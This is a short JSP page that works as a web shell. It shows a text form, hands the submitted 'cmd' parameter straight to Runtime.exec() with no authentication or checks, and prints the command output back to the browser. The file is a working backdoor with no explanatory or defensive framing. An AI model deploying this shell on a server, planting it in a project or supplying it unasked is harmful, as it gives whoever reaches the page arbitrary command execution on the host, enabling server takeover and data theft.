<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
String ShellPath = "";
String output = "";

// if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
//     ShellPath = new String("/bin/bash -c '");
// } else {
//     ShellPath = new String("cmd.exe");
// }

if (request.getParameter("cmd") != null) {
    try {
        // String command = ShellPath  + request.getParameter("cmd") + "'";
        String command = request.getParameter("cmd");

        out.println("Running Command: " + command + "<BR>");
        Process p = Runtime.getRuntime().exec(command);
        InputStream in = p.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
             out.println(new String(b));
        }
         out.print("</pre>");
        out.println("Finished!");
    } catch(Exception e) {
       e.printStackTrace();
    }

}
%>
</pre>
</BODY></HTML>
